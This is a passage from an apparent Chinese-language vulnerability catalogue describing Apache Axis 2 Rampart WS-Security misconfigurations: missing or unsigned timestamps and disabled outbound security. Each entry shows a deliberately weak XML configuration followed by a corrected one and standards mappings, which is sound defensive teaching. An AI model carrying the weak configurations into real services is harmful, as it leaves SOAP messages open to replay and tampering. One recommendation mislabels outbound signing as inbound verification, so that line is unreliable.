<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-149"><a href="#RECOMMENDATIONS-149" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为对输出的消息进行签名。</p>
<p>下列服务提供程序配置可让 Axis 2 对输出的消息进行签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Signature 指令置于 Encrypt 指令之前以及 Timestamp 指令之后，可确保对时间戳进行签名以及对签名和时间戳进行加密。</p>
<h5 id="REFERENCES-148"><a href="#REFERENCES-148" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[3] Standards Mapping - FIPS200 CM, SC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Timestamp"><a href="#Axis-2-Service-Provider-Misconfiguration-Missing-Outbound-Timestamp" class="headerlink" title="Axis 2 Service Provider Misconfiguration: Missing Outbound Timestamp"></a>Axis 2 Service Provider Misconfiguration: Missing Outbound Timestamp</h4><h5 id="ABSTRACT-150"><a href="#ABSTRACT-150" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若缺少时间戳，会导致 SOAP 消息遭受 replay 攻击。</p>
<h5 id="EXPLANATION-151"><a href="#EXPLANATION-151" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息安全数据的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者会欺骗接收者接受恶意消息。</p>
<p>下列 Apache Axis 2 Rampart 配置的 <code>&lt;items&gt;</code> 标签中缺少 Timestamp 指令，因此该服务不会发送带有时间戳的消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">   &lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-150"><a href="#RECOMMENDATIONS-150" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将服务配置为在输出的消息中发送时间戳。 下列 Apache Axis 2 Rampart 配置的 <code>&lt;items&gt;</code>标签中包含 Timestamp 指令，因此该服务在输出的消息中包含时间戳。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">   &lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Timestamp 指令置于 Signature 指令和 Encrypt 指令之前，可确保对时间戳进行签名和加密。</p>
<h5 id="REFERENCES-149"><a href="#REFERENCES-149" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 254</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3870 CAT I, APP3260 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3870 CAT I, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3870 CAT I, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3870 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3870 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3870 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000190 CAT I, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[24] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-Outbound-WS-Security-Not-Enabled"><a href="#Axis-2-Service-Provider-Misconfiguration-Outbound-WS-Security-Not-Enabled" class="headerlink" title="Axis 2 Service Provider Misconfiguration: Outbound WS-Security Not Enabled"></a>Axis 2 Service Provider Misconfiguration: Outbound WS-Security Not Enabled</h4><h5 id="ABSTRACT-151"><a href="#ABSTRACT-151" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>不使用 WS-Security 的服务提供程序，可能无法保证消息的完整性或保密性。</p>
<h5 id="EXPLANATION-152"><a href="#EXPLANATION-152" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>WS-Security 是 SOAP 的扩展功能，无论采用何种传输协议，它都能提供端到端的消息完整性和保密性。不使用 WS-Security 时，将依靠传输安全性来保证消息的完整性和保密性。如果一项服务将消息转发到其他服务，则会使用中继点之间最薄弱的传输机制传送消息。WS-Security 可移除传输安全性 dependency，并保护消息的安全。</p>
<p>若 Apache Axis 2 配置文件中缺少 OutflowSecurity 参数，则表明未启用输出消息的安全性。</p>
<h5 id="RECOMMENDATIONS-151"><a href="#RECOMMENDATIONS-151" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为对输出的响应使用 WS-Security。此配置应包含 OutflowSecurity 参数，如下例所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-150"><a href="#REFERENCES-150" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM, SC</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-Unsigned-Inbound-Timestamp"><a href="#Axis-2-Service-Provider-Misconfiguration-Unsigned-Inbound-Timestamp" class="headerlink" title="Axis 2 Service Provider Misconfiguration: Unsigned Inbound Timestamp"></a>Axis 2 Service Provider Misconfiguration: Unsigned Inbound Timestamp</h4><h5 id="ABSTRACT-152"><a href="#ABSTRACT-152" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未经签名的时间戳会导致 SOAP 消息遭受 tampering 及 replay 攻击。</p>
<h5 id="EXPLANATION-153"><a href="#EXPLANATION-153" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的“新鲜性”。如果攻击者截取了一则消息，稍后将其转发，则接收者能够拒绝此 replay 攻击，因为时间戳会指明该消息已过期。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息、修改时间戳，以及转发该消息。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<p>下列服务提供程序配置可让 Axis 2 接受带有未经签名的时间戳的消息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-152"><a href="#RECOMMENDATIONS-152" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为对输入的时间戳验证签名。</p>
<p>下列服务提供程序配置可让 Axis 2 验证输入请求的签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;InflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<p>顺序非常重要！将 Timestamp 指令置于 Signature 指令和 Encrypt 指令之前，可确保对时间戳进行签名和加密。</p>
<h5 id="REFERENCES-151"><a href="#REFERENCES-151" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3260.1 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3860 CAT II, APP3260 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3860 CAT II, APP3260 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3860 CAT II, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3860 CAT II, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3860 CAT II, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3860 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[24] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Provider-Misconfiguration-Unsigned-Outbound-Timestamp"><a href="#Axis-2-Service-Provider-Misconfiguration-Unsigned-Outbound-Timestamp" class="headerlink" title="Axis 2 Service Provider Misconfiguration: Unsigned Outbound Timestamp"></a>Axis 2 Service Provider Misconfiguration: Unsigned Outbound Timestamp</h4><h5 id="ABSTRACT-153"><a href="#ABSTRACT-153" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>未经签名的时间戳会导致 SOAP 消息遭受 tampering 及 replay 攻击。</p>
<h5 id="EXPLANATION-154"><a href="#EXPLANATION-154" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>安全性时间戳可表明消息的安全语义的“新鲜性”。因此，如果消息被截取，并稍后再次传送，则接收者可以拒绝陈旧的消息。时间戳可包含有效期属性，通过该属性，可对安全语义的有效期设置一个硬限制。</p>
<p>为避免攻击者篡改时间戳，应对时间戳执行签名。如果 SOAP 消息的时间戳未经签名，则攻击者可在接收者不知情的情况下截取该消息并修改时间戳。在这种情况下，攻击者可能会欺骗接收者接受恶意消息。</p>
<p>下列服务提供程序配置可让 Axis 2 发送未经签名的时间戳：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-153"><a href="#RECOMMENDATIONS-153" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将该服务配置为对输入的时间戳验证签名。</p>
<p>下列服务提供程序配置可让 Axis 2 对输出的消息进行签名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;service&gt;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;action&gt;</span><br><span class="line"></span><br><span class="line">			&lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">			...</span><br><span class="line"></span><br><span class="line">		&lt;/action&gt;</span><br><span class="line"></span><br><span class="line">	&lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-152"><a href="#REFERENCES-152" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 345</p>
<p>[4] Standards Mapping - FIPS200 CM</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
